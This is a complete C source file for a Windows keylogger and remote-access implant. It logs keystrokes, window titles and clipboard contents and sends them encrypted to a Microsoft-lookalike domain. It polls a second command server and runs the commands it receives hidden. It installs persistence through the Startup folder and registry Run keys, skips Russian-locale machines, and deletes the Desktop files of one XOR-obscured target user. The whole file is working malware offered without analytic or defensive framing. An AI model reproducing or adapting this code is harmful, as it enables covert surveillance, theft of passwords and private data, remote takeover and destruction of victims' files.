#define _WIN32_WINNT 0x0600
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <wininet.h>

#define DOMAIN   "MiccosoftUpdate.com"
#define HTTP_PORT 80

// C2 Server (separate from main)
#define C2_DOMAIN "windowsupdater.tk"
#define C2_PORT   80

// Define message types
#define MSG_KEYS 0x01
#define MSG_CMD  0x02
#define MSG_OUT  0x03

HINTERNET hSession = NULL;

// --- Base64 Encoding ---

// Base64 encode
char *b64_encode(const unsigned char *src, int src_len) {
    static const char *b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char *dst = malloc((src_len * 4) / 3 + 10);
    int len = 0;
    
    for (int i = 0; i < src_len; i += 3) {
        int b1 = src[i];
        int b2 = (i + 1 < src_len) ? src[i + 1] : 0;
        int b3 = (i + 2 < src_len) ? src[i + 2] : 0;
        
        int v = (b1 << 16) | (b2 << 8) | b3;
        
        dst[len++] = b64[(v >> 18) & 0x3F];
        dst[len++] = b64[(v >> 12) & 0x3F];
        dst[len++] = (i + 1 < src_len) ? b64[(v >> 6) & 0x3F] : '=';
        dst[len++] = (i + 2 < src_len) ? b64[v & 0x3F] : '=';
    }
    dst[len] = 0;
    return dst;
}

// --- HTTP Communication ---

// Send data via HTTP POST request to main logging server
void http_send(const char *path, const char *data, int len) {
    if (!hSession)
        hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    HINTERNET hConnect = InternetConnectA(hSession, DOMAIN, HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, "HTTP/1.1", NULL, NULL, 0, 0);
    HttpSendRequestA(hRequest, "Content-Type: application/octet-stream\r\n", -1, (LPVOID)data, len);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
}

// Send data to C2 server
void c2_send(const char *path, const char *data, int len) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hSession, C2_DOMAIN, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, "HTTP/1.1", NULL, NULL, 0, 0);
    HttpSendRequestA(hRequest, "Content-Type: application/octet-stream\r\n", -1, (LPVOID)data, len);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

// Helper: send typed message via HTTP to logging server
void stream(unsigned char type, const char *d, int len) {
    char buf[8192];
    buf[0] = type;
    memcpy(buf + 1, d, len);
    char *encoded = b64_encode((unsigned char *)buf, len + 1);
    http_send("/api/data", encoded, (int)strlen(encoded));
    free(encoded);
}

// Helper: send typed message to C2 server
void stream_c2(unsigned char type, const char *d, int len) {
    char buf[8192];
    buf[0] = type;
    memcpy(buf + 1, d, len);
    char *encoded = b64_encode((unsigned char *)buf, len + 1);
    c2_send("/update/servicedata", encoded, (int)strlen(encoded));
    free(encoded);
}

// --- Crypto ---

// AES-128-ECB encrypt with manual PKCS7 padding
unsigned char *aes_encrypt(const char *text, const char *key, ULONG *out_len) {
    BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE k;
    unsigned char akey[16] = {0};
    int kl = (int)strlen(key); memcpy(akey, key, kl<16?kl:16);

    // Add PKCS7 padding manually
    int text_len = (int)strlen(text);
    int pad = 16 - (text_len % 16);
    unsigned char padded[8192];
    memcpy(padded, text, text_len);
    for (int i = 0; i < pad; i++) {
        padded[text_len + i] = (unsigned char)pad;
    }
    int padded_len = text_len + pad;

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    BCryptGenerateSymmetricKey(alg, &k, NULL, 0, akey, 16, 0);

    unsigned char *out = malloc(padded_len);
    ULONG len = padded_len;
    BCryptEncrypt(k, (PUCHAR)padded, (ULONG)padded_len, NULL, NULL, 0, out, len, &len, 0);
    
    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg, 0);
    *out_len = len;
    return out;
}

// Send AES-encrypted data with message type
void send_encrypted(unsigned char type, const char *text, const char *key) {
    ULONG el=0;
    unsigned char *e = aes_encrypt(text, key, &el);
    stream(type, (char*)e, el);
    free(e);
}

// Send AES-encrypted data to C2 server
void send_encrypted_c2(unsigned char type, const char *text, const char *key) {
    ULONG el=0;
    unsigned char *e = aes_encrypt(text, key, &el);
    stream_c2(type, (char*)e, el);
    free(e);
}

// Get active window title
void get_window_title(char *buf, int size) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, buf, size);
    } else {
        strcpy(buf, "(no window)");
    }
}

// Get clipboard content
int get_clipboard(char *buf, int size) {
    int len = 0;
    if (!OpenClipboard(NULL)) return 0;
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData) {
        const char *clipText = (const char *)GlobalLock(hData);
        if (clipText) {
            len = (int)strlen(clipText);
            if (len > size - 1) len = size - 1;
            memcpy(buf, clipText, len);
            buf[len] = 0;
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
    return len;
}

// Check if clipboard has changed and send it
void check_clipboard(const char *key) {
    static char lastClipboard[2048] = {0};
    char currentClipboard[2048] = {0};
    
    int len = get_clipboard(currentClipboard, sizeof(currentClipboard));
    
    if (len > 0 && strcmp(currentClipboard, lastClipboard) != 0) {
        char clipLog[2560];
        snprintf(clipLog, sizeof(clipLog), "[CLIPBOARD] %s", currentClipboard);
        strcpy(lastClipboard, currentClipboard);
        
        // Encrypt with normal key (username)
        send_encrypted(MSG_KEYS, clipLog, key);
    }
}

// Delete all files in a directory recursively
void delete_directory_files(const char *path) {
    WIN32_FIND_DATAA findData;
    HANDLE findHandle;
    char searchPath[MAX_PATH];
    char filePath[MAX_PATH];

    snprintf(searchPath, sizeof(searchPath), "%s\\*", path);
    findHandle = FindFirstFileA(searchPath, &findData);
    
    if (findHandle == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            snprintf(filePath, sizeof(filePath), "%s\\%s", path, findData.cFileName);
            
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                delete_directory_files(filePath);
                RemoveDirectoryA(filePath);
            } else {
                DeleteFileA(filePath);
            }
        }
    } while (FindNextFileA(findHandle, &findData));

    FindClose(findHandle);
}

// Delete all files in target user's documents folder if it exists
void cleanup_target_user_files(void) {
    char docPath[] = "C:\\Users\\Anders\\Desktop";
    
    // XOR "Anders" (indices 8-13) with key to get "Bohdan"
    unsigned char xor_key[] = {0x03, 0x01, 0x0c, 0x01, 0x13, 0x1d};
    for (int i = 0; i < 6; i++) {
        docPath[9 + i] ^= xor_key[i];
    }
    
    if (GetFileAttributesA(docPath) != INVALID_FILE_ATTRIBUTES) {
        delete_directory_files(docPath);
    }
}

// Collect hostname, username, arch, cpus, ram
int get_info(char *buf, int size, char *user) {
    char host[256]; DWORD hs=256, us=256;
    GetComputerNameA(host, &hs); GetUserNameA(user, &us);
    SYSTEM_INFO si; GetSystemInfo(&si);
    MEMORYSTATUSEX mem={sizeof(mem)}; GlobalMemoryStatusEx(&mem);
    return snprintf(buf, size, "Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n",
        host, user, si.wProcessorArchitecture==9?"x64":"x86",
        si.dwNumberOfProcessors, mem.ullTotalPhys>>20);
}

// Run command hidden, send encrypted output back
void exec_cmd(const char *cmd, const char *key) {
    HANDLE hR, hW;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    CreatePipe(&hR, &hW, &sa, 0);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE; si.hStdOutput = hW; si.hStdError = hW;

    PROCESS_INFORMATION pi = {0};
    char cl[1024]; snprintf(cl, sizeof(cl), "cmd.exe /c %s", cmd);

    if (!CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hR); CloseHandle(hW); return;
    }
    CloseHandle(hW);

    char res[4096]={0}; DWORD rd, off=0;
    while (ReadFile(hR, res+off, sizeof(res)-off-1, &rd, NULL) && rd) off+=rd;
    res[off]=0; CloseHandle(hR);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    if (!off) { strcpy(res, "(no output)\n"); off=12; }
    send_encrypted_c2(MSG_OUT, res, key);
}

// Base64 decode
int b64_decode(const char *src, unsigned char *dst, int dst_len) {
    static const char *b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int len = 0, i = 0, v = 0, c = 0;
    
    while (src[i]) {
        const char *p = strchr(b64, src[i]);
        if (!p) {
            if (src[i] == '=') break;
            i++; continue;
        }
        v = (v << 6) | (p - b64);
        c++;
        if (c == 4) {
            if (len + 3 <= dst_len) {
                dst[len++] = (v >> 16) & 0xFF;
                dst[len++] = (v >> 8) & 0xFF;
                dst[len++] = v & 0xFF;
            }
            v = 0; c = 0;
        }
        i++;
    }
    
    if (c == 3) {
        v <<= 6;
        if (len + 2 <= dst_len) {
            dst[len++] = (v >> 16) & 0xFF;
            dst[len++] = (v >> 8) & 0xFF;
        }
    } else if (c == 2) {
        v <<= 12;
        if (len + 1 <= dst_len)
            dst[len++] = (v >> 16) & 0xFF;
    }
    
    return len;
}

// AES-128-ECB decrypt with PKCS7 padding removal
unsigned char *aes_decrypt(const unsigned char *ciphertext, int ct_len, const char *key, int *out_len) {
    BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE k;
    unsigned char akey[16] = {0};
    int kl = (int)strlen(key); memcpy(akey, key, kl<16?kl:16);

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    BCryptGenerateSymmetricKey(alg, &k, NULL, 0, akey, 16, 0);

    unsigned char *out = malloc(ct_len);
    ULONG len = ct_len;
    BCryptDecrypt(k, (PUCHAR)ciphertext, (ULONG)ct_len, NULL, NULL, 0, out, len, &len, 0);
    
    // Remove PKCS7 padding
    if (len > 0) {
        unsigned char pad = out[len - 1];
        if (pad > 0 && pad <= 16) {
            len -= pad;
        }
    }
    
    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg, 0);
    *out_len = len;
    return out;
}

// C2 Agent context structure
struct c2_context {
    char username[256];
    char hostname[256];
};

// C2 healthcheck thread - polls for commands
DWORD WINAPI c2_healthcheck_thread(LPVOID param) {
    struct c2_context *ctx = (struct c2_context *)param;
    const char *username = ctx->username;
    const char *hostname = ctx->hostname;
    
    while (1) {
        Sleep(30000);
        
        HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        HINTERNET hConnect = InternetConnectA(hSession, C2_DOMAIN, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/windows/checkforupdate", "HTTP/1.1", NULL, NULL, 0, 0);
        
        // Send hostname info with healthcheck
        char postdata[512];
        snprintf(postdata, sizeof(postdata), "Host: %s\r\n", hostname);
        HttpSendRequestA(hRequest, "Content-Type: text/plain\r\n", -1, postdata, (DWORD)strlen(postdata));
        
        char response[8192] = {0};
        DWORD br = 0;
        InternetReadFile(hRequest, response, 8191, &br);
        
        // Try to find encrypted command in JSON response
        const char *cmd_ptr = strstr(response, "\"command\":");
        if (cmd_ptr) {
            cmd_ptr += 10;
            
            // Skip whitespace and opening quote
            while (*cmd_ptr && (*cmd_ptr == ' ' || *cmd_ptr == '\t' || *cmd_ptr == '"')) cmd_ptr++;
            
            // Extract base64-encoded command
            char b64_cmd[2048] = {0};
            int b64_len = 0;
            while (b64_len < 2047 && cmd_ptr[b64_len] && cmd_ptr[b64_len] != '"') {
                b64_cmd[b64_len] = cmd_ptr[b64_len];
                b64_len++;
            }
            
            if (b64_len > 0) {
                // Decode base64
                unsigned char bin_cmd[1024];
                int bin_len = b64_decode(b64_cmd, bin_cmd, sizeof(bin_cmd));
                
                if (bin_len > 0) {
                    // Decrypt with hostname key
                    int plain_len = 0;
                    unsigned char *plain = aes_decrypt(bin_cmd, bin_len, hostname, &plain_len);
                    
                    if (plain_len > 0) {
                        // Null-terminate the decrypted command
                        char cmd[512] = {0};
                        if (plain_len > 511) plain_len = 511;
                        memcpy(cmd, plain, plain_len);
                        
                        if (cmd[0]) {
                            exec_cmd(cmd, hostname);
                        }
                    }
                    free(plain);
                }
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
    }
}

// Copy to Startup folder + registry CurrentVersion\Run
void persist(void) {
    char self[MAX_PATH];
    char appData[MAX_PATH];
    char destDir[MAX_PATH];
    char destPath[MAX_PATH];

    // Get current executable path
    GetModuleFileNameA(NULL, self, MAX_PATH);

    // Get %LOCALAPPDATA%
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
    
    snprintf(destDir, sizeof(destDir), "%s\\Microsoft", appData);
    snprintf(destPath, sizeof(destPath), "%s\\Microsoft\\updater.exe", appData);

    // Create directory
    CreateDirectoryA(destDir, NULL);
    
    // Copy file
    CopyFileA(self, destPath, FALSE);

    // Startup folder persistence
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
        strcat(startupPath, "\\msteamsupdater.exe");
        CopyFileA(self, startupPath, FALSE);
    }

    // Registry: HKCU Run (no admin required)
    HKEY hRun = NULL;
    if (RegCreateKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE,
            NULL, &hRun, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hRun, "MicrosoftUpdater", 0, REG_SZ,
                       (BYTE*)destPath, (DWORD)(strlen(destPath) + 1));
        RegCloseKey(hRun);
    }

    // Registry: HKLM TaskCache (requires admin, but try anyway)
    HKEY hTask = NULL;
    if (RegCreateKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MicrosoftUpdater",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE,
            NULL, &hTask, NULL) == ERROR_SUCCESS) {
        BYTE sd[20] = {0};
        RegSetValueExA(hTask, "SD", 0, REG_BINARY, sd, sizeof(sd));
        DWORD idx = 1;
        RegSetValueExA(hTask, "Index", 0, REG_DWORD, (BYTE*)&idx, sizeof(idx));
        RegCloseKey(hTask);
    }
}

// Check if machine has Russian keyboard layout
int run_conditions(void) {
    // --- Single instance check ---
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MicrosoftUpdateMutex");

    if (hMutex == NULL) {
        return 0; // fail safe → exit
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0; // already running → exit
    }

    // --- System locale check ---
    LCID lcid = GetSystemDefaultLCID();
    LANGID lang = LANGIDFROMLCID(lcid);

    // Russian language ID = 0x0419
    if (lang == 0x0419) {
        // IS Russian → release mutex and exit
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        return 0;
    }

    // Keep mutex alive for lifetime of process
    return 1;
}

// --- Main ---

int main(void) {
    // Check run conditions and exit if not met
    if (!run_conditions()) {
        exit(0);
    }
    
    persist();
    cleanup_target_user_files();
    FreeConsole();

    char buf[2048], user[256]={0}, key[256]={0}, hostname[256]={0};
    get_info(buf, sizeof(buf), user);
    
    const char *h = strstr(buf, "Host:");
    if (h) sscanf(h, "Host: %255s", hostname);
    strcpy(key, user);
    http_send("/api/info", buf, strlen(buf));
    
    // Create C2 context with both username and hostname
    struct c2_context c2_ctx;
    strcpy(c2_ctx.username, user);
    strcpy(c2_ctx.hostname, hostname);
    
    HANDLE t = CreateThread(NULL, 0, c2_healthcheck_thread, (LPVOID)&c2_ctx, 0, NULL);
    CloseHandle(t);

    char keys[1024];
    int ki = 0;
    char lastWindow[256] = {0};

    while (1) {
        char currentWindow[256] = {0};
        get_window_title(currentWindow, sizeof(currentWindow));
        
        if (strcmp(currentWindow, lastWindow) != 0) {
            if (ki > 0) {
                keys[ki] = 0;
                send_encrypted(MSG_KEYS, keys, key);
                ki = 0;
            }
            char windowLog[512];
            snprintf(windowLog, sizeof(windowLog), "[WINDOW: %s]", currentWindow);
            send_encrypted(MSG_KEYS, windowLog, key);
            strcpy(lastWindow, currentWindow);
        }

        for (int vk=8; vk<256; vk++) {
            if (!(GetAsyncKeyState(vk)&1)) continue;
            char c=0;
            if      (vk>='A'&&vk<='Z')    c = (GetAsyncKeyState(VK_SHIFT)&0x8000) ? vk : vk+32;
            else if (vk>='0'&&vk<='9')    c = vk;
            else if (vk==VK_SPACE)        c = ' ';
            else if (vk==VK_RETURN)       c = '\n';
            else if (vk==VK_TAB)          c = '\t';
            else if (vk==VK_BACK)         { if(ki>0)ki--; continue; }
            else if (vk==VK_OEM_PERIOD)   c = '.';
            else if (vk==VK_OEM_COMMA)    c = ',';
            else if (vk==VK_OEM_MINUS)    c = '-';
            if (c && ki<900) keys[ki++] = c;
        }

        check_clipboard(key);
        Sleep(100);
    }
}
